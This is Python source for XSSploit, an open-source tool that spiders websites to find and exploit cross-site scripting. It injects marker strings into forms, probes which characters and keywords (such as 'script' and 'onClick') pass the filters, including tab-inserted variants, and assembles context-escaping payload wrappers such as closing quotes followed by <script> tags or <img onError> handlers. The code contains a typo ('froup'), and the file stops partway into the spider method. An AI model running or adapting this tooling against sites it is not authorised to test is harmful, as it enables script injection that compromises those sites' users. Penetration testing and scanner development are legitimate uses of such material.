#!/usr/bin/env python
# -*- coding: iso-8859-1 -*-

# XSSploit
# Copyright (C) 2008 Nicolas OBERLI
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

__VERSION = '0.5'
"""Application version"""

import rlcompleter,  code,  time, sys,  getopt
import random,  string,  re,  os
import urllib,  urllib2, cookielib,  socket
import logging

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import threading

_READLINE=0
"""Tells if the readline module is present"""
_BASEURL=''
"""Sets the base URL the user entered"""

try:
	import readline
	_READLINE=1
except ImportError:
	print 'Unable to import readline. Tab completition will not be usable'
	_READLINE=0

import BeautifulSoup

try:
  from lxml import etree
except ImportError:
      # Python 2.5
      import xml.etree.ElementTree as etree

class xssAnalyzer:
    """
    Request forgery, filter detection and avoidance
    """
    
    PATTERNLENGTH=15
    """Sets the number of characters in the pattern"""
    
    def __init__(self,  wwwIOInstance=''):
        self._params=[]
        """stores the param tests"""
        self._analysisLevel=2
        """Sets the scanning level - 2 by default"""
        self.badChars=[]
        """Stores the bad chars to check"""
        if wwwIOInstance=='':
            self._wwwIO=wwwIO()
        else:
            self._wwwIO=wwwIOInstance
        self._loadKeywords()

    def setAnalysisMode(self,  mode):
        """
        Defines the number of parameters to put together in a request
        @type mode: Integer
        @param mode: The maximum number of parameters to put in a request
        """
        self._analysisLevel=mode

    def _combineParams(self,  k):
        """
        Reorders and sort any unique combinations of the list
        @type k: list
        @param k: List of parameters to sort
        @return: A list containing the randomized fields
        """
        paramsList=[]
        i=1
        while i<self._analysisLevel+1:
            for uc in self._xcombinations(k,i):
                paramsList.append(uc)
            i=i+1
        return paramsList

    def _generatePattern(self):
        """
        Generates a pattern
        @return: a pattern like (xxxxxxxxxxxxxxx)
        """
        return '('+''.join([random.choice(string.ascii_letters+string.digits) for x in xrange(self.PATTERNLENGTH)])+')'

    def _generateRequests(self,  formID,  params):
        """
        Defines all the requests to test
        @type formID: Integer
        @param formID: The form ID for the requests
        @type params: List
        @param params: the parameter list
        @return: The requests in a dictionnary form
        """
        lsRequest=[]
        finalRequests=[]
        paramName=params[-1]
        if len(params)==1:
            pattern=self._generatePattern()
            return [[[paramName,  {paramName:  pattern}]]]
        paramValues=self._formDB.getParamValues(formID,  paramName)
        params.pop()
        finalRequests=[]
        for value in paramValues:
            if value=='':
                    value='XSSploit'
            for lsRequest in self._generateRequests(formID,  params):
                lsRequest[0][1].update({paramName:  value})
                finalRequests.append(lsRequest)
                logging.debug('Request created : '+ str(lsRequest))
                lsRequest=[]
        return finalRequests
    
    def analyzeFormDB(self,  formDB,  permCheck=1):
        """
        Performs the first analysis on the formDB
        @type formDB : formDB
        @param formDB: The formDB instance to analyze
        @type permCheck: Integer
        @param permCheck: Tells if XSSploit should check for permanent XSS 0=No 1=Yes
        @return: A list of xss instances (if found)
        """
        self._formDB=formDB
        """Stores the formDB"""
        results=[]
        """Stores the final request list"""
        tmpFile=open('xssploit.tmp', 'w+')
        logging.info('Checking for XSS...')
        for form in self._formDB._forms:
            formID=form[0]
            formUrl=self._formDB.getFormUrl(formID)
            formMethod=self._formDB.getFormMethod(formID)
            requestParamsList=self._combineParams(formDB.getParamNames(formID))
            for requestlist in requestParamsList:
                for request in self._generateRequests(formID,  requestlist):
                    tmpFile.write(str(formID)+'\\'+str(request[0][1])+'\n')
                    xss=self._checkXss(formID,  request[0])
                    if xss:
                        for xssFound in results:
                            if xss.vulnerableParameter==xssFound.vulnerableParameter and xss.url==xssFound.url:
                                del xss
                                break
                        else:
                            results.append(xss)
        tmpFile.close()
        if permCheck==1:
            logging.info('Checking for permanent XSS...')
            patterns=self._wwwIO.spiderPermanent()
            for permanentXSS in self._checkPermanentXss(patterns):
                if permanentXSS:
                    for xssFound in results:
                        if permanentXSS.vulnerableParameter==xssFound.vulnerableParameter and permanentXSS.parameters==xssFound.parameters:
                            xssFound.type='persistant'
                            del permanentXSS
                            break
                    else:
                        results.append(permanentXSS)
        os.remove("xssploit.tmp")
        return results

    def _escapeContext(self,  xssObject):
        """
        Try to escape a bad context by looking in the bad characters.
        Updates the escapeHeader and escapeTrailer attributes
        It will modify the escaped attribute if yes
        @type xssObject: xss
        @param xssObject: The xss instance to check
        @return: 1 if successfull, 0 otherwise
        """
        logging.debug('Begining context escaping for  : '+ xssObject.url+'('+xssObject.vulnerableParameter+')')
        #scriptWord will contain the script word we will use
        regexp=re.compile("'(s.{0,1}c.{0,1}r.{0,1}i.{0,1}p.{0,1}t)'",  re.IGNORECASE)
        scriptWord = regexp.search(str(xssObject.goodChars))
        if scriptWord:
            scriptWord=scriptWord.group(1)
            logging.debug('Script word used : '+scriptWord)
        for context in xssObject.context:
            _escaped=0
            #Are we in a tag ?
            if context[0]=='tag':
                logging.debug('XSS is in a tag : '+ context[1])
                #Is it possible to close and open a new tag ?
                if "<" in xssObject.goodChars and '>' in xssObject.goodChars:
                    #Are there any double quotes to escape ?
                    if "'" in xssObject.goodChars and '"' in xssObject.goodChars:
                        xssObject.escapeHeader='"\'>'
                        logging.debug('XSS escapeHeader (no magic_quotes) : '+xssObject.escapeHeader)
                    #We can also bypass this filter even with the PHP magic_quotes
                    if '"' in xssObject.badChars and "'" in xssObject.badChars:
                        if xssObject.badChars['"']=='\\"' and xssObject.badChars["'"]=="\\'":
                            xssObject.escapeHeader='"\'>'
                            logging.debug('XSS escapeHeader (magic_quotes) : '+xssObject.escapeHeader)
                    #Not necessary, but it's nicer to cleanly end the HTML
                    if '<' not in xssObject.badChars and '!' not in xssObject.badChars and '-' not in xssObject.badChars:
                        xssObject.escapeTrailer='<!--'
                        logging.debug('XSS escapeTrailer : '+xssObject.escapeTrailer)
                    _escaped=1
                else:
                    #Let's try to add a custom Javascript event in the tag
                    if "=" in xssObject.goodChars and 'onClick' in xssObject.goodChars:
                        regexp=re.compile('(.)\(.{'+str(xssAnalyzer.PATTERNLENGTH)+'}\)(.)')
                        result=regexp.search(context[1])
                        #Are we between quotes ?
                        if result.group(1)=='\'':
                            if '\'' in xssObject.goodChars:
                                xssObject.escapeHeader='\' OnClick=\''
                                if result.froup(2)<>'\'':
                                    xssObject.escapeTrailer='\''
                                _escaped=1
                        #Are we between " ?
                        elif result.group(1)=='\"':
                            if '\"' in xssObject.goodChars:
                                xssObject.escapeHeader='" OnClick="'
                                if result.group(2)<>'"':
                                    xssObject.escapeTrailer='"'
                                _escaped=1
                        #No string delimiter ?
                        else:
                            if '\"' in xssObject.goodChars:
                                xssObject.escapeHeader='"" OnClick="'
                                xssObject.escapeTrailer='"'
                            _escaped=1
                        if _escaped==1:
                            xssObject._exploitable=xss.ONECOMMANDEXPLOIT
                            return 1
            #Are we between HTML tags? let's try to close and reopen them
            elif context[0]<>'':
                logging.debug('XSS is in random tag : '+context[1])
                if '<' not in xssObject.badChars and '>' not in xssObject.badChars and '/' not in xssObject.badChars:
                    xssObject.escapeHeader='</'+context[0]+'>'
                    xssObject.escapeTrailer='<'+context[0]+'>'
                    _escaped=1
            #No context ? or escaped from context ?
            if context[0]=='' or _escaped==1:
                logging.debug('OK, creating execution context')
                #Can we create custom HTML tags ?
                if '<' in xssObject.goodChars and '>' in xssObject.goodChars:
                    #Can we close it ? If so, try to create <script>...</script> tags
                    if '/' in xssObject.goodChars and scriptWord:
                            xssObject.escapeHeader=xssObject.escapeHeader+'<'+scriptWord+'>'
                            xssObject.escapeTrailer='</'+scriptWord+'>'+xssObject.escapeTrailer
                            xssObject._exploitable=xss.FULLEXPLOIT
                            logging.debug('Creating <script></script> execution context')
                            return 1
                    #Can't close it ? Let's try to add a fake image with onError javascript handling
                    elif '=' in xssObject.goodChars:
                        if '"' in xssObject.goodChars:
                            xssObject.escapeHeader=xssObject.escapeHeader+'<img src="" onError="'
                            xssObject.escapeTrailer='">'+xssObject.escapeTrailer
                            xssObject._exploitable=xss.FULLEXPLOIT
                            logging.debug('Creating buggy <img> execution context (with \")')
                            return 1
                        elif "'" in xssObject.goodChars:
                            xssObject.escapeHeader=xssObject.escapeHeader+"<img src='' onError='"
                            xssObject.escapeTrailer="'>"+xssObject.escapeTrailer
                            xssObject._exploitable=xss.FULLEXPLOIT
                            logging.debug('Creating buggy <img> execution context (with \')')
                            return 1
                        #for this one, only one javascript command can be passed
                        elif "`" in xssObject.goodChars:
                            xssObject.escapeHeader=xssObject.escapeHeader+"<img src=`` onError="
                            xssObject.escapeTrailer=">"+xssObject.escapeTrailer
                            xssObject._exploitable=xss.ONECOMMANDEXPLOIT
                            logging.debug('Creating buggy <img> execution context (with `)')
                            return 1
                #Sorry, XSSploit cannot do anything for you
                else:
                    logging.debug('Cannot create tags, cannot create execution context')
                    pass
        #There's nothing we can do to escape the context, sorry...
        xssObject._exploitable=xss.NOEXPLOIT
        logging.debug('No favorable context, unexploitable for the moment')
        return 0

    def analyzeXSS(self,  xssObject):
        """
        Analyses an XSS
            - Checks if some characters are refused
            - Checks if some keywords are refused
            - Analyzes the context
        """
        logging.info('Checking for bad chars and context...')
        self._checkBadChars(xssObject)
        logging.info('Checking for contexts...')
        self._checkContext_ng(xssObject)
        logging.info('Trying to escape contexts')
        self._escapeContext(xssObject)
    
    def _xcombinations(self,  items, n):
        """
        Create cominations of items in a list
        @type items: List
        @param items: The items to combinate
        @type n: Integer
        @param n: The number of items in the shuffled list
        @return: A list containing lists with the combinated elements
        """
        if n==0: yield []
        else:
            for i in xrange(len(items)):
                for cc in self._xcombinations(items[:i]+items[i+1:],n-1):
                    yield [items[i]]+cc
    
    def _checkXss(self,  formID,  params):
        """
        Checks for an XSS in a page
        @type formID: Integer
        @param formID: The form ID
        @type params: List
        @param formID: The parameters
        @return: an xss instance if the pattern is found
        """
        url=self._formDB.getFormUrl(formID)
        method=self._formDB.getFormMethod(formID)
        pattern=params[1][params[0]]
        param=params[1]
        patternRegexp=pattern.replace('(', '\(')
        patternRegexp=patternRegexp.replace(')', '\)')
        regexp=re.compile(patternRegexp,  re.IGNORECASE| re.MULTILINE)
        htmlCode=self._wwwIO.httpInject(url,  param,  method)
        patternFound=regexp.search(htmlCode)
        if patternFound:
            patternFound=patternFound.group()
            logging.debug('XSS found : pattern = '+pattern)
            xssObject=xss()
            xssObject.setUrl(url)
            xssObject.setMethod(method)
            xssObject.setVulnerableParameter(params[0])
            #Removes the vulnerable parameter, since it's in his own field
            del params[1][params[0]]
            #Checks if the characters are transformed in lower or uppercase
            if patternFound==pattern:
                xssObject._charModifier=xss.NOTRANSFORM
            elif patternFound==pattern.lower():
                xssObject._charModifier=xss.LOWERCASE
            elif patternFound==pattern.upper():
                xssObject._charModifier=xss.UPPERCASE
            xssObject.setParameters(params[1])
            return xssObject

    def _checkPermanentXss(self,  foundPatterns):
        """
        Checks if a permanent XSS exists on the website
        @type foundPatterns: List
        @param foundPatterns: The patterns found on the site
        @return: A list containing instances of the xss class
        """
        xssCollection=[]
        tmpFile=open('xssploit.tmp', 'r+')
        data=tmpFile.read()
        tmpFile.close
        for patternItem in foundPatterns:
            pattern=patternItem[0]
            regexp=re.compile('.*'+pattern+'.*')
            found=regexp.search(data)
            if found:
                xssParams={}
                line=found.group(0)
                formID=int(line[:line.find('\\')])
                formUrl=self._formDB.getFormUrl(formID)
                formMethod=self._formDB.getFormMethod(formID)
                parameters=line[line.find('\\')+1:]
                parameters=parameters.strip('{}')
                for parameter in parameters.split(', '):
                    parameter=parameter.split(': ')
                    if parameter[1].strip("'")==pattern:
                        vulnerableParameter=parameter[0].strip("'")
                    xssParams.update({parameter[0].strip("'"):  parameter[1].strip("'")})
                xssObject=xss()
                xssObject.setUrl(formUrl)
                xssObject.setMethod(formMethod)
                xssObject.type='persistant'
                xssObject.setVulnerableParameter(vulnerableParameter)
                del xssParams[vulnerableParameter]
                xssObject.setParameters(xssParams)
                xssCollection.append(xssObject)
                del xssObject
        return xssCollection
    
    def _checkBadChars(self,  xssObject):
        """
        Checks an XSS for filtered characters
        @type xssObject: xss
        @param xssObject: An instance of the XSS class
        @return: The modified xss instance
        """
        logging.debug('Begining bad chars testing for '+ xssObject.url+'('+xssObject.vulnerableParameter+')')
        xssParameters={}
        xssUrl=xssObject.url
        xssMethod=xssObject.method
        xssParameters.update(xssObject.parameters)
        xssVulnerableParameter=xssObject.getVulnerableParameter()
        badChars=self.badChars
        for char in badChars:
            pattern=self._generatePattern()
            #Randomizes badChars position
            position=random.randint(2, len(pattern)-2)
            pattern=pattern[:position]+char+pattern[position+1:]
            xssParameters.update({xssVulnerableParameter: pattern})
            #Not, we replace the pattern injected with the REGEXP
            pattern=pattern.replace('(', '\(')
            pattern=pattern.replace(')', '\)')
            pattern=pattern.replace(char,  '(.*)')
            regexp=re.compile(pattern,  re.IGNORECASE | re.MULTILINE)
            htmlCode=self._wwwIO.httpInject(xssUrl,  xssParameters,  xssMethod)
            patternFound=regexp.search(htmlCode)
            if patternFound:
                if patternFound.group(1)==char:
                    xssObject.goodChars.append(char)
                    logging.debug('Found in pattern ! char '+ char + ' is good')
                else:
                    xssObject.badChars.update({char:  patternFound.group(1)})
                    logging.debug('Not found in pattern ! char '+ char + ' is bad')
            del patternFound
    
    def _loadKeywords(self):
        """
        Loads the keywords
            - Some basic chars are fixed in the application
            - It's possible to add more keywords by adding them in the keywords.txt file (one word per line)
            - If there is a word, creates a string with a tabulation in it to bypass some filters
        @return: Fills the badChars property of this instance
        """
        self.badChars=['<', '>', ':', ',', '"', "'",'`', '.',  ';', '-',  '_',  '%',  '&',  '/', '=',  '!',  '@',  '#',' ',  'script',  'javascript',  'sCriPt',  'jAvaScrIpt', 'onLoad', 'onClick']
        if os.path.exists("keywords.txt"):
            file=open("keywords.txt",  "r")
            data=file.readlines()
            file.close()
            for line in data:
                #os.linesep defines the line separators used depending the OS
                char=line.rstrip(os.linesep)
                if len(char)>1:
                    #TODO: Implementing null char and make it working with the XML output
                    #position=random.randint(2, len(char)-1)
                    #newchar=char[:position]+'\0'+char[position:]
                    #self.badChars.append(newchar)
                    position=random.randint(2, len(char)-1)
                    newchar=char[:position]+'\t'+char[position:]
                    self.badChars.append(newchar)
                self.badChars.append(char)
            logging.debug('keywords.txt loaded : '+str(self.badChars))
        else:
            #If the file doesn't exists
            logging.info('No keywords.txt found')

    def _getContext(self,  htmlSoup,  pattern):
        """
        Gets the context the pattern fits in
        @type htmlSoup: BeautifulSoup
        @param htmlSoup: The HTML code, in BeautifulSoup
        @type pattern: String
        @param pattern: Then pattern to match
        @return: A list of [type, context] elements
        """
        result=[]
        if str(htmlSoup).find(pattern)>=0:
            if isinstance(htmlSoup,BeautifulSoup.Tag):
                if str(htmlSoup.attrs).find(pattern)>=0:
                    logging.debug('Pattern is in tag '+htmlSoup.name)
                    result.append(['tag',  str(htmlSoup)])
                else:
                    for x in htmlSoup.contents:
                        contexts=self._getContext(x,pattern)
                        if contexts is not None:
                            for context in contexts:
                                result.append(context)
            elif isinstance(htmlSoup,BeautifulSoup.NavigableString):
                if str(htmlSoup).find(pattern)>=0:
                    for parent in htmlSoup.findParents():
                        if parent.name=='script':
                            logging.debug('Pattern is in script tag')
                            result.append(['script',str(parent)])
                        elif parent.name=='title':
                            logging.debug('Pattern is in title tag')
                            result.append(['title',str(parent)])
                        elif parent.name=='noscript':
                            logging.debug('Pattern is in noscript tag')
                            result.append(['noscript',str(parent)])
                        elif parent.name=='textarea':
                            logging.debug('Pattern is in textarea tag')
                            result.append(['textarea',str(parent)])
                    if len(result)==0:
                        logging.debug('No particular context')
                        result.append(['', str(htmlSoup)])
            return result

    def _checkContext_ng(self,  xssObject):
        """
        Checks the context our XSS fills in - New version
        @type xssObject: xss
        @param xssObject: An instance of the XSS class
        @return: The modified xss instance
        """
        xssParameters={}
        xssUrl=xssObject.url
        xssMethod=xssObject.method
        xssParameters.update(xssObject.parameters)
        xssVulnerableParameter=xssObject.getVulnerableParameter()
        badChars=self.badChars
        pattern=self._generatePattern()
        xssParameters.update({xssVulnerableParameter: pattern})
        htmlCode=self._wwwIO.httpInject(xssUrl,  xssParameters,  xssMethod)
        htmlSoup=BeautifulSoup.BeautifulSoup(htmlCode)
        if xssObject._charModifier==xss.LOWERCASE:
            pattern=pattern.lower()
        elif xssObject._charModifier==xss.UPPERCASE:
            pattern=pattern.upper()
        contexts=self._getContext(htmlSoup,  pattern)
        if contexts is not None:
            for context in contexts:
                #Little hack here : we need the exact HTML code to build our XSS
                if context[0]=='tag':
                    regexp=re.compile('<[^>]*'+pattern.replace('(', '\(').replace(')', '\)')+'.*?>', re.MULTILINE|re.DOTALL)
                    context[1]=regexp.search(htmlCode).group()
                xssObject.context.append(context)

    def _checkContext(self,  xssObject):
        """
        Checks the context our XSS fills in - DEPRECATED
        @type xssObject: xss
        @param xssObject: An instance of the XSS class
        @return: The modified xss instance
        """
        _patternChecked=0
        xssParameters={}
        xssUrl=xssObject.url
        xssMethod=xssObject.method
        xssParameters.update(xssObject.parameters)
        xssVulnerableParameter=xssObject.getVulnerableParameter()
        badChars=self.badChars
        pattern=self._generatePattern()
        xssParameters.update({xssVulnerableParameter: pattern})
        pattern=pattern.replace('(', '\(')
        pattern=pattern.replace(')', '\)')
        htmlCode=self._wwwIO.httpInject(xssUrl,  xssParameters,  xssMethod)
        regexp=re.compile('.*('+pattern+').*',  re.IGNORECASE)
        regexpContext=re.compile('<[^>]*('+pattern+')[^<]*>',  re.IGNORECASE)
        regexpScript= re.compile("<script>(?!.*</script>.*"+pattern+".*).*("+pattern+").*(?!.*"+pattern+".*<script>.*)</script>", re.IGNORECASE)
        regexpText= re.compile("<textarea>(?!.*</textarea>.*"+pattern+".*).*("+pattern+").*(?!.*"+pattern+".*<textarea>.*)</textarea>", re.IGNORECASE)
        regexpTitle= re.compile("<title>(?!.*</title>.*"+pattern+".*).*("+pattern+").*(?!.*"+pattern+".*<title>.*)</title>", re.IGNORECASE)
        #Really ugly REGEXPs. re.DOTALL permits multiline tag finding
        regexpScriptMulti= re.compile("<script>(?!.*</script>.*"+pattern+".*).*("+pattern+").*(?!.*"+pattern+".*<script>.*)</script>", re.IGNORECASE | re.DOTALL)
        regexpTextMulti= re.compile("<textarea>(?!.*</textarea>.*"+pattern+".*).*("+pattern+").*(?!.*"+pattern+".*<textarea>.*)</textarea>", re.IGNORECASE | re.DOTALL)
        regexpTitleMulti= re.compile("<title>(?!.*</title>.*"+pattern+".*).*("+pattern+").*(?!.*"+pattern+".*<title>.*)</title>", re.IGNORECASE)
        for patternFound in regexp.finditer(htmlCode):
            for patternContextFound in regexpContext.finditer(htmlCode):
                #Checks if we are inside an HTML tag
                if  patternContextFound and patternContextFound.start(1)==patternFound.start(1):
                        xssObject.context.append(['tag', patternContextFound.group()])
                        _patternChecked=1
            for patternContextFound in regexpScript.finditer(htmlCode):
                #Checks if we are inside <script> tags
                if  patternContextFound and patternContextFound.start(1)==patternFound.start(1):
                        xssObject.context.append(['script',  patternContextFound.group()])
                        _patternChecked=1
            for patternContextFound in regexpText.finditer(htmlCode):
                #Checks if we are inside <textarea> tags
                if  patternContextFound and patternContextFound.start(1)==patternFound.start(1):
                        xssObject.context.append(['textarea', patternContextFound.group()])
                        _patternChecked=1
            for patternContextFound in regexpTitle.finditer(htmlCode):
                #Checks if we are inside <title> tags
                if  patternContextFound and patternContextFound.start(1)==patternFound.start(1):
                        xssObject.context.append(['title', patternContextFound.group()])
                        _patternChecked=1
            for patternContextFound in regexpScriptMulti.finditer(htmlCode):
                #Checks if we are inside multiline <script> tags
                if  patternContextFound and patternContextFound.start(1)==patternFound.start(1):
                        xssObject.context.append(['script',  patternContextFound.group()])
                        _patternChecked=1
            for patternContextFound in regexpTextMulti.finditer(htmlCode):
                #Checks if we are inside multiline <textarea> tags
                if  patternContextFound and patternContextFound.start(1)==patternFound.start(1):
                        xssObject.context.append(['textarea', patternContextFound.group()])
                        _patternChecked=1
            for patternContextFound in regexpTitleMulti.finditer(htmlCode):
                #Checks if we are inside multiline <title> tags
                if  patternContextFound and patternContextFound.start(1)==patternFound.start(1):
                        xssObject.context.append(['title', patternContextFound.group()])
                        _patternChecked=1
            if _patternChecked==0:
                xssObject.context.append(['',  patternFound.group()])
            _patternChecked=0
    
class xss:
    """
    Stores an XSS, and all the parameters it has
    """
    NOTRANSFORM=0
    """Sets the string modification"""
    LOWERCASE=1
    """Sets the string modification"""
    UPPERCASE=2
    """Sets the string modification"""
    
    NOEXPLOIT=0
    FULLEXPLOIT=1
    ONECOMMANDEXPLOIT=2
    """Defines what we can do with these XSS"""
    
    def __init__(self):
        self.url=''
        """Holds the URL of the vulnerable page"""
        self.method=''
        """Holds the method to use"""
        self.parameters={}
        """Holds the parameters to get the XSS working"""
        self.vulnerableParameter=''
        """Holds the faulty parameter"""
        self.badChars={}
        """Holds all the denied characters"""
        self.goodChars=[]
        """Holds all the accepted characters"""
        self.escapeHeader=''
        """Holds the contect escaping header (if any)"""
        self.escapeTrailer=''
        """Holds the contect escaping trailer (if any)"""
        self.type='non-persistant'
        """Sety the XSS type"""
        self.urlWhereFound=''
        """Sets the URL to look for the permanent XSS"""
        self.context=[]
        """Stores the XSS contexts"""
        self._exploitable=None
        """Tells if XSSploit can exploit this XSS"""
        self._charModifier=0
#        self.score=10
#        """Sets the useability of an XSS"""
    
    def setUrl(self,  url):
        """
        Sets the URL of the vulnerable page
        @type url: String
        @param url: The URL to the page
        """
        self.url=url
    
    def setMethod(self,  method):
        """
        Sets the method of the vulnerable page
        @type method: String
        @param method: The method to use to send the parameters
        """
        self.method=method
        
    def setVulnerableParameter(self,  name):
        """
        Sets the vulnerable parameter of the page
        @type name: String
        @param name: The parameter name
        """
        self.vulnerableParameter=name
    
    def getVulnerableParameter(self):
        """
            Gets the vulbnerable parameter
            @return: The vilnerable parameter
        """
        return self.vulnerableParameter
    
    def setParameters(self,  parameters):
        """
        Sets the other parameters to send to get the XSS working
        @type parameters: Dictionary
        @param parameters: The values to send {name:value}
        """
        self.parameters=parameters
    
    def getParameters(self):
        """
        Gets the parameters for the XSS
        @return: A list containing all the parameters
        """
        return self.parameters
    
    def xmlDump(self):
        """
        Returns the XSS in XML format
        @return: An ElementTree instance with the XSS informations
        """
        Xss = etree.Element("xss")
        Xss.set("url", self.url)
        Xss.set("method", self.method)
        Xss.set("VulnerableParameter",  self.vulnerableParameter)
        Xss.set("type",  self.type)
        Element=etree.SubElement(Xss,  "exploitable")
        if self._exploitable==None or self._exploitable==xss.NOEXPLOIT:
            Element.text='False'
        else:
            Element.text='True'
        for param in self.parameters:
            Element=etree.SubElement(Xss,  "parameter")
            Element.set("name", param)
            Element.set("value", self.parameters[param])
        for char in self.badChars:
            Element=etree.SubElement(Xss,  "BadChar")
            Element.text=char
        for char in self.goodChars:
            Element=etree.SubElement(Xss,  "GoodChar")
            Element.text=char
        for contextString in self.context:
            try:
                Element=etree.SubElement(Xss,  'Context')
                Element.text=contextString[1].strip()
            except ValueError:
                logging.warning('Null byte problem !')
        return Xss

    def printSummary(self):
        print '\n====== XSS ======'
        print '= URL    : ' + self.url
        print '= Type   : ' + self.type
        print '= Method : ' + self.method
        print '=== Faulty parameter : ' + self.vulnerableParameter
        if len(self.parameters)>0:
            print '=== Other parameters : ' + str(self.parameters)
        if len(self.badChars)>0:
            print '===== Bad characters : '
            for bad in self.badChars:
                print bad
        if len(self.context)>0:
            print '===== Contexts : '
            for context in self.context:
                if context[0]<>'':
                    print context[1]
    
class wwwIO:
    """
    www input/output class, used for retreiving HTML, spidering a site, analysing a page for forms, ...
    """

    def __init__(self):
        self.urlFound=[]
        """List - Stores the URL's found in spider mode"""
        self._urlSearched=[]
        """List - Stores the URL's analyzed, in spider mode"""
        self._urlToSearch=[]
        """List - Stores the URL's to search, in the spider mode"""
        self._baseDomain=''
        """Defines the base domain for the search"""
        self._extensions=[]
        """Defines the file extensions to use"""
        self._loadExtensions()
        self._excluedUrl=[]
        """The exclued pages list"""
        self._cookiejar = cookielib.CookieJar()
        """Defines a cookiejar to store the cookies"""
        cookieOpener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self._cookiejar))
        urllib2.install_opener(cookieOpener)
        self.formDB=formDB()
        """formDB instance to put all the results in"""
        self.patternFound=[]
        """Stores the patterns when searching for permanent XSS"""
        socket.setdefaulttimeout(5)
        """Sets a default timeout for the connections"""
    
    def setTimeout(self,  time):
        if type(time)==type(1):
            socket.setdefaulttimeout(time)
    
    def filterUrl(self, url,  folder=''):
        """
        Filters the URL given to delete /../xxx, also transforms URL's from relative to absolute path
        @type url: String
        @param url: The URL to filter
        @type folder: String
        @param folder: Optionnal - The folder of the file
        @return: A string containing the filtered URL
        """
        #Some sites use "&amp;" instead of "&", fixing that
        url=url.replace('&amp;', '&')
        if url.find('http://')<>-1 or url.find('https://')<>-1:
            return url
        #transforms the link from relative to absolute path
        if url.find(self._baseDomain)==-1 or url.find('http://')==-1:
            if url[0]=='/':
                url=url.lstrip('/')
            url=(folder+url)
        #Removes the xxx/../
        regexp=re.compile('/[^/]*/\.\./')
        url=regexp.sub('/', url)
        url=regexp.sub('/', url)
        #Removes the /./
        url=url.replace('/./', '/') 
        return url
    
    def _loadExtensions(self):
        """
        Loads the file extensions in the extensions.txt file
        It also creates the extensions.txt file if it doesn't exist
        @return: Fills the _extensions property of this instance
        """
        if os.path.exists("extensions.txt"):
            file=open("extensions.txt",  "r")
            data=file.readlines()
            file.close()
            for line in data:
                #os.linesep defines the line separators used depending the OS
                ext=line.rstrip(os.linesep)
                self._extensions.append(ext)
                #Sorts the extentions in reverse order, so the REGEXP won't fail (.asp - .aspx)
                self._extensions.sort(reverse=True)
            logging.debug('extensions.txt loaded : '+str(self._extensions))
        else:
            #If the file doesn't exists, we create one and call _loadExtensions again
            logging.info('No extensions.txt found, building one')
            extensions=['.shtml', '.html', '.htm', '.php3', '.php', '.aspx', '.asp']
            file=open("extensions.txt",  "w")
            for ext in extensions:
                file.write(ext+os.linesep)
            file.close()
            self._loadExtensions()
    
    def _createRegexp(self):
        """
        Create the link finding REGEXP
        Takes the file extensions from the _extensions instance attribute
        @return: A re object
        """
        strExt=''
        for ext in self._extensions:
            strExt=strExt+ext.replace('.', '\.')+'|'
        #Remove the last | char
        strExt=strExt[:-1]
        return re.compile('[-?=/.&%#:\w]*('+strExt+')[-?=/.&%#:;\w]*', re.IGNORECASE)
        
    
    def getExcluedUrls(self):
        """
        Gets the exclued URLs list
        @return: A list containing the URLs
        """
        return self._excluedUrl
    
    def excludeUrl(self,  url):
        """
        Excludes an URL from being spidered
        @type url: String
        @param url: The url to exclude, it will be checked as a REGEXP, so REGEXP syntax can be used.
        """
        if url not in self._excluedUrl:
            self._excluedUrl.append(url)
    
    def addUrlToSearch(self,  url):
        """
        Adds the URL to the ToDo list if it is a new URL on the same host
        @type url: String
        @param url: The URL to add
        @return: None
        """
        if url not in self._urlToSearch and url not in self._urlSearched and url.find(self._baseDomain)==0:
            for strRegexp in self._excluedUrl:
                strRegexp = strRegexp+'.*$'
                regexp = re.compile(strRegexp,  re.IGNORECASE)
                if regexp.search(url):
                    logging.debug('Exclusion : ' + url + ' matched the following exclusion : '+ strRegexp)
                    return
            #Can be used if we don't want to check pages with parameters...
            #self._urlToSearch.append(url[url.find('?')+1:])
            self._urlToSearch.append(url)

    def authConfig(self,  usr,  pwd):
        """
        Defines a HTTP basic authentication handler
        @type usr: String
        @param usr: The username to use
        @type pwd: String
        @param pwd: The password to use
        """
        auth_handler = urllib2.HTTPBasicAuthHandler()
        auth_handler.add_password(realm='basicHTTP',  uri='',  user=usr,  passwd=pwd)
        opener = urllib2.build_opener(auth_handler)
        urllib2.install_opener(opener)
    
    def proxyConfig(self,  proxyString):
        """
        Configures the proxy support in urllib2
        @type proxyString: String
        @param proxyString: The proxy config string like http://[user]:[pass]@[host]:[port] - If the string is empty, disables the proxy
        """
        if proxyString=='':
            proxy_handler = urllib2.ProxyHandler()
        else:
            proxy_handler = urllib2.ProxyHandler({'http': proxyString})
        opener = urllib2.build_opener(proxy_handler)
        urllib2.install_opener(opener)

    def getPage(self,  url):
        """
        Gets the HTML content of a URL
        @type url: String
        @param url: The URL to retreive
        @return: A list containing the HTML code parsed with uTidylib
        """
        url=self.filterUrl(url)
        if self._urlSearched.count(url)<>0:
            return
        try:
            f=urllib2.urlopen(url)
        except urllib2.HTTPError,  e:
            logging.error('Error '+str(e.code)+' on '+url)
            return
        except socket.timeout:
            logging.warning('Timeout on '+url)
            return
        except:
            return
        #Debug only...
        logging.debug('Getting page '+url)
        try:
            return f.read()
        except socket.timeout:
            logging.warning('Timeout on '+url)
            return

    def getFolder(self,  url):
        """
        Gives the folder of the page in the URL
        @type url: String
        @param url: The full URL
        @return: The folder
        """
        if url.find('?')<>-1:
            url=url[:url.find('?')]
        ind=url.rfind("/", 7)
        if ind<>-1:
            folder=url[:ind]
        else:
            folder=url
        if folder[len(folder)-1]<>"/":
            folder=folder+'/'
        return folder

    def _clean(self):
        """
        Cleans all the instance properties
        """
        del self.formDB
        self.formDB=formDB()
        self.baseUrl=''
        self.urlFound=[]
        self._urlSearched=[]
        self._urlToSearch=[]

    def spider(self,  baseURL):
        """
        Spiders a site from the given URL
        @type baseURL: String
        @param baseURL: The starting URL
        @return: a formDB instance containing all the forms found
        """
        self._clean()
        global _BASEURL
        _BASEURL=baseURL
        self.baseUrl=baseURL
        self._urlToSearch.append(baseURL)
